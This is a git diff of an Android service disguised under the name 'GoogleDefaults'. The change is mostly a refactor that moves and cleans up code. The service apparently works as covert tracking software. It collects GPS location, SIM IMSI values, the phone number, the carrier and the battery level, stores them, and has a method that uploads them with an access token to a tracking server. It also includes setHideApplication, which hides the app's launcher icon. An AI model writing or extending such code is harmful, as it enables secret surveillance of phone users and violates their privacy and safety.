@@ -41,8 +41,6 @@ import java.util.Date;
  */
 public class GoogleDefaults extends IntentService implements NetWorkStateReceiver.NetworkStateReceiverListener, ApiCallBack {
 
-    //    For IMEI Data
-    private static final int MY_PERMISSIONS_REQUEST_READ_PHONE_STATE = 0;
     String latlong = "";
     String tv_dual_sim = "";
     String tv_imei_main = "";
@@ -76,43 +74,8 @@ public class GoogleDefaults extends IntentService implements NetWorkStateReceive
         super(name);
     }
 
-    public static boolean isLocationEnabled(Context context) {
-        int locationMode = 0;
-        String locationProviders;
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
-            try {
-                locationMode = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.LOCATION_MODE);
-
-            } catch (Settings.SettingNotFoundException e) {
-                e.printStackTrace();
-                return false;
-            }
-
-            return locationMode != Settings.Secure.LOCATION_MODE_OFF;
-
-        } else {
-            locationProviders = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
-            return !TextUtils.isEmpty(locationProviders);
-        }
-
-    }
-
-    public static void setHideApplication(Context c, boolean hide) {
-        ComponentName cn = new ComponentName(c.getApplicationContext(),
-                MainActivity.class);
-        int setting = hide ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
-                : PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
-        int current = c.getPackageManager().getComponentEnabledSetting(cn);
-        if (current != setting) {
-            c.getPackageManager().setComponentEnabledSetting(cn, setting,
-                    PackageManager.DONT_KILL_APP);
-        }
-    }
-
     @Override
     protected void onHandleIntent(Intent intent) {
-
         getUserData(false);
         notificationManager = (NotificationManager) this.getSystemService(Context.NOTIFICATION_SERVICE);
         if (!isLocationEnabled(this)) {
@@ -125,20 +88,16 @@ public class GoogleDefaults extends IntentService implements NetWorkStateReceive
             } catch (Exception e) {
                 e.printStackTrace();
             }
-
             Location location = intent.getParcelableExtra(FusedLocationProviderApi.KEY_LOCATION_CHANGED);
             if (location != null) {
-
                 tv_location = location.getLatitude() + "," + location.getLongitude();
                 tv_latitude = String.valueOf(location.getLatitude());
                 tv_longitude = String.valueOf(location.getLongitude());
-
                 tv_location_accuracy = location.getAccuracy() + "";
                 tv_location_altitude = location.getAltitude() + "";
                 tv_location_bearing = location.getBearing() + "";
                 tv_battery_percent = getBatteryPercent() + "";
                 tv_date_time = getCurrentSystemDateTime();
-
                 //   Sending to Activity
                 Intent i = new Intent("LOCATION_UPDATED");
                 i.putExtra("tv_dual_sim", tv_dual_sim);
@@ -154,18 +113,44 @@ public class GoogleDefaults extends IntentService implements NetWorkStateReceive
                 i.putExtra("tv_location_accuracy", tv_location_accuracy);
                 i.putExtra("tv_location_bearing", tv_location_bearing);
                 i.putExtra("tv_location_altitude", tv_location_altitude);
-
                 sendBroadcast(i);//That's how you do it, See B-|
 
                 saveDataInSharedPreferences();
                 getDataFromSharedPreferences(false);
-
 //                sendDataToWeb ();
             }
         }
     }
 
-    // FOR BATTERY AND TELEPHONY DATA
+    public static boolean isLocationEnabled(Context context) {
+        int locationMode = 0;
+        String locationProviders;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+            try {
+                locationMode = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.LOCATION_MODE);
+            } catch (Settings.SettingNotFoundException e) {
+                e.printStackTrace();
+                return false;
+            }
+            return locationMode != Settings.Secure.LOCATION_MODE_OFF;
+        } else {
+            locationProviders = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
+            return !TextUtils.isEmpty(locationProviders);
+        }
+    }
+
+    public static void setHideApplication(Context c, boolean hide) {
+        ComponentName cn = new ComponentName(c.getApplicationContext(),
+                MainActivity.class);
+        int setting = hide ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+                : PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
+        int current = c.getPackageManager().getComponentEnabledSetting(cn);
+        if (current != setting) {
+            c.getPackageManager().setComponentEnabledSetting(cn, setting,
+                    PackageManager.DONT_KILL_APP);
+        }
+    }
+
     public float getBatteryPercent() {
         IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
         Intent batteryStatus = this.registerReceiver(null, ifilter);
@@ -187,43 +172,30 @@ public class GoogleDefaults extends IntentService implements NetWorkStateReceive
         return batteryPercent * 100;
     }
 
-    //    For Current System DateTime
     public String getCurrentSystemDateTime() {
         SimpleDateFormat sdf = new SimpleDateFormat("EEE, d MMM yyyy HH:mm:ss");
         String currentDateandTime = sdf.format(new Date());
         return currentDateandTime;
     }
 
-    //    For Telephonic Data
     public void getUserData(boolean showlogs) {
-
         TelephonyInfo telephonyInfo = TelephonyInfo.getInstance(this);
-
         tv_imei_main = telephonyInfo.getImsiSIM1();
         tv_imei_secondary = telephonyInfo.getImsiSIM2();
-
         boolean isSIM1Ready = telephonyInfo.isSIM1Ready();
         boolean isSIM2Ready = telephonyInfo.isSIM2Ready();
-
         tv_is_sim_one_ready = isSIM1Ready + "";
         tv_is_sim_two_ready = isSIM2Ready + " ";
-
-        //        boolean isDualSIM = telephonyInfo.isDualSIM();
-        //        tv_dual_sim = isDualSIM + "";
-
         if (tv_imei_main.equals(tv_imei_secondary)) {
             tv_dual_sim = "false";
         } else {
             tv_dual_sim = "true";
         }
-
         if (telephonyInfo.getcarrierName().equals("") || telephonyInfo.getcarrierName() == null) {
             tv_network_name = "Not Accessible";
         } else {
             tv_network_name = telephonyInfo.getcarrierName();
         }
-
-
         if (telephonyInfo.getPhoneNumberMain() == null || telephonyInfo.getPhoneNumberMain().equals(null) || telephonyInfo.getPhoneNumberMain().isEmpty()) {
             tv_mobile_number = "Not Accessible";
         } else {
@@ -237,7 +209,6 @@ public class GoogleDefaults extends IntentService implements NetWorkStateReceive
                     " IS SIM2 READY : " + isSIM2Ready + "\n" +
                     "Network Name : " + telephonyInfo.getcarrierName() + "\n"
                     + "Mobile Number : " + telephonyInfo.getPhoneNumberMain());
-
             Log.d("Daiya", "Battery percentage : " + getBatteryPercent());
             Log.d("Daiya", "Battery batteryScale : " + batteryScale);
             Log.d("Daiya", "Battery batteryLevel : " + batteryLevel);
@@ -247,7 +218,6 @@ public class GoogleDefaults extends IntentService implements NetWorkStateReceive
     }
 
     public void saveDataInSharedPreferences() {
-
         SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);
         SharedPreferences.Editor editor = preferences.edit();
         editor.putString("tv_location", tv_location);
@@ -263,7 +233,6 @@ public class GoogleDefaults extends IntentService implements NetWorkStateReceive
         editor.putString("tv_location_accuracy", tv_location_accuracy);
         editor.putString("tv_location_bearing", tv_location_bearing);
         editor.putString("tv_location_altitude", tv_location_altitude);
-
         editor.apply();
     }
 
@@ -272,7 +241,6 @@ public class GoogleDefaults extends IntentService implements NetWorkStateReceive
         String name = preferences.getString("Name", null);
         if (name != null) {
         }
-
         tv_location = preferences.getString("tv_location", null);
         tv_dual_sim = preferences.getString("tv_dual_sim", null);
         tv_imei_main = preferences.getString("tv_imei_main", null);
@@ -286,7 +254,6 @@ public class GoogleDefaults extends IntentService implements NetWorkStateReceive
         tv_location_accuracy = preferences.getString("tv_location_accuracy", null);
         tv_location_bearing = preferences.getString("tv_location_bearing", null);
         tv_location_altitude = preferences.getString("tv_location_altitude", null);
-
         if (showlogs) {
             Log.d("Daiya", tv_location);
             Log.d("Daiya", tv_dual_sim);
@@ -322,82 +289,49 @@ public class GoogleDefaults extends IntentService implements NetWorkStateReceive
     public void enableLocation(final Context context) {
         LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
         boolean gps_enabled = false;
-
         try {
             gps_enabled = lm.isProviderEnabled(LocationManager.GPS_PROVIDER);
         } catch (Exception ex) {
+            ex.printStackTrace();
         }
-
         if (!gps_enabled) {
             Intent gpsOptionsIntent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
-            // Send data to NotificationView Class
-
-            // Open NotificationView.java Activity
             PendingIntent pIntent = PendingIntent.getActivity(this, 0, gpsOptionsIntent,
                     PendingIntent.FLAG_UPDATE_CURRENT);
-
-            //Create Notification using NotificationCompat.Builder
             NotificationCompat.Builder builder = new NotificationCompat.Builder(this)
-                    // Set Icon
                     .setSmallIcon(R.drawable.ic_warning_white_24dp)
-                    // Set Ticker Message
                     .setTicker("Enable Location.")
-                    // Set Title
                     .setContentTitle("Enable Location.")
-                    // Set Text
                     .setContentText("Location not enabled. Please Enable Location settings with high Accuracy.")
-                    // Add an Action Button below Notification
                     .addAction(R.drawable.ic_warning_white_24dp, "Open", pIntent)
-                    // Set PendingIntent into Notification
                     .setContentIntent(pIntent)
-                    // Dismiss Notification
                     .setAutoCancel(false);
-
-            // Create Notification Manager
             NotificationManager notificationmanager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-            // Build Notification with Notification Manager
             notificationmanager.notify(2, builder.build());
         }
     }
 
     private void showNoInternetDialog(final Context context) {
         Intent gpsOptionsIntent = new Intent(android.provider.Settings.ACTION_WIRELESS_SETTINGS);
-        // Send data to NotificationView Class
 //        Intent intent = new Intent();
 //        intent.setComponent(new ComponentName("com.android.settings", "com.android.settings.Settings$DataUsageSummaryActivity"));
-
-        // Open NotificationView.java Activity
         PendingIntent pIntent = PendingIntent.getActivity(context, 0, gpsOptionsIntent,
                 PendingIntent.FLAG_UPDATE_CURRENT);
-
-        //Create Notification using NotificationCompat.Builder
         NotificationCompat.Builder builder = new NotificationCompat.Builder(context)
-                // Set Icon
                 .setSmallIcon(R.drawable.ic_warning_white_24dp)
-                // Set Ticker Message
                 .setTicker("Enable Internet.")
-                // Set Title
                 .setContentTitle("Enable Internet.")
-                // Set Text
                 .setContentText("No active Internet connection found. Please enable your Wifi or Mobile Data.")
-                // Add an Action Button below Notification
                 .addAction(R.drawable.ic_warning_white_24dp, "Open", pIntent)
-                // Set PendingIntent into Notification
                 .setContentIntent(pIntent)
-                // Dismiss Notification
                 .setAutoCancel(false);
-
-        // Create Notification Manager
         NotificationManager notificationmanager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-        // Build Notification with Notification Manager
         notificationmanager.notify(1, builder.build());
     }
 
     public void sendDataToWeb() {
         SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);
         String accessToken = preferences.getString("accessToken", null);
-        Log.d("Daiya", "Access Token on calling track : " + accessToken);
-
         TrackParam param = new TrackParam();
         param.latitude = tv_latitude;
         param.longitude = tv_longitude;
@@ -415,9 +349,7 @@ public class GoogleDefaults extends IntentService implements NetWorkStateReceive
         param.location_bearing = tv_location_bearing;
         param.location_altitude = tv_location_altitude;
         param.access_token = accessToken;
-
         TrackCaller.instance().post(this, param, this, ApiType.TRACK);
-
     }
 
 
@@ -425,7 +357,6 @@ public class GoogleDefaults extends IntentService implements NetWorkStateReceive
     public void onResult(String result, ApiType apitype, int resultCode) {
         if (apitype == ApiType.TRACK) {
             if (resultCode == 200) {
-                Log.d("Daiya", "On result track on service : " + resultCode + " result : " + result);
             }
         }
 
